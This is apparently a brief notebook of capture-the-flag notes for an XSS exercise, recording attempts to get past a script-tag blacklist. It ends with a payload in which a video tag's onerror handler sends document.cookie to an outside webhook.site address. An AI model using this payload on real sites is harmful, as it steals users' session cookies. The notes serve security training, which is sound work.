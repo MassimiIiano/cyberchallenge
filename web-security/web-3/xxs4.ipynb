{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "1. try to enter\n",
    "    - the body is empty\n",
    "2. trying to send a script tat we notice we are on a black list\n",
    "    - the body is a script\n",
    "3. try other tags\n",
    "\n",
    "```html\n",
    "<video onerror=\"fetch('https://webhook.site/0cc67171-c7dc-4706-93df-d653427f627a?flag='+document.cookie)\">\n",
    "</video>\n",
    "```\n"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
